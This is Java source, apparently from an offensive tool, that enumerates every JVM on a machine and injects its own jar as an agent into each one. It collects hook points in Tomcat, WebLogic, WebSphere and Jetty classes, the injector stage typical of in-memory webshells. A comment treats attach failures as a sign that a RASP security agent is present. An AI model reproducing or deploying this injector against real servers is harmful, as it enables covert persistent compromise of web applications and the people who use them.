package indi.augusttheodor;

import com.sun.tools.attach.AgentInitializationException;
import com.sun.tools.attach.AgentLoadException;
import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;
import indi.augusttheodor.stage.JettyStage;
import indi.augusttheodor.stage.Stage;
import indi.augusttheodor.stage.TomcatStage;
import indi.augusttheodor.stage.WebLogicStage;
import indi.augusttheodor.stage.WebSphereStage;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

//这个工具类用来获取JVM并Attach
//如果有人看到这里，这里所使用的的com.sun.tools在java/libs/tools.jar内
//通过这个方式枚举JVM，是我见过的比较常用的方法 Java总是面面俱到，连埋自己的坟也提前挖好了
public class AttachA {

    private static final List<Stage> STAGES = new ArrayList<>();
    static {
        STAGES.add(new TomcatStage());
        STAGES.add(new WebLogicStage());
        STAGES.add(new WebSphereStage());
        STAGES.add(new JettyStage());
    }

    public static List<Stage> getStages() {
        return STAGES;
    }

    public static void doAttach(String args) throws IOException, AgentLoadException, AgentInitializationException {
        // 这个方法将自身注入所有JVM
        String jarPath = AttachA.class.getProtectionDomain().getCodeSource().getLocation().getFile();
        jarPath = new File(jarPath).getPath();
        List<VirtualMachineDescriptor> vList;
        try {
            vList = VirtualMachine.list(); // 获取JVM列表
        } catch (NoClassDefFoundError | UnsatisfiedLinkError e) {
            System.out.println("[错误] 无法加载 Java Attach 机制，通常是因为当前运行环境是 JRE 而非 JDK，");
            System.out.println("        或缺少对应平台的 attach native 库（Windows: attach.dll / Linux: libattach.so）。");
            System.out.println("        请使用 JDK 运行 Agenst，或将 attach 的 native 库放到 JRE 的 bin/lib 目录。");
            e.printStackTrace();
            return;
        } catch (Exception e) {
            System.out.println("[错误] 枚举 JVM 列表失败：" + e.getMessage());
            e.printStackTrace();
            return;
        }
        if (vList == null || vList.isEmpty()) {
            System.out.println("[提示] 未找到可附加的 JVM 进程。");
            return;
        }
        for (VirtualMachineDescriptor vmd : vList) {
            String vmdName = vmd.displayName();
            if (vmdName.contains(new File(jarPath).getName())) { // 防止改名，这里用动态获取的名字
                continue; // 排除自己
            }
            System.out.println("-------->附加到" + vmdName);
            try {
                VirtualMachine attachV = VirtualMachine.attach(vmd); // 开始附加
                attachV.loadAgent(jarPath, args); // 注入本jar到目标进程 然后它会调用agentmain
            } catch (Exception ea) {
                System.out.println(
                        vmdName + "----------------不支持Attach！请注意，这一般提示当前进程已经被另一个Agent接管——有可能是RASP（一种动态安全检测工具）。");
                ea.printStackTrace();
            }

        }
    }

    public static HashMap<String, String[]> findAttachClasses() {
        // 这个方法用于寻找注入目标
        // 返回值为HashMap<ClassName,MethodName>
        // 其实用HashMap不太严谨，但是这很方便
        // 如果遇见无法注入的情况就延长这个表 over！
        HashMap<String, String[]> re = new HashMap<>();
        for (Stage stage : STAGES) {
            re.putAll(stage.getHookPoints());
        }
        return re;
    }

    public static Stage getStageForClass(String className) {
        for (Stage stage : STAGES) {
            if (stage.getHookPoints().containsKey(className)) {
                return stage;
            }
        }
        return null;
    }

    public static byte[] getRedefineClassBytes() {
        return new byte[0];
    }
}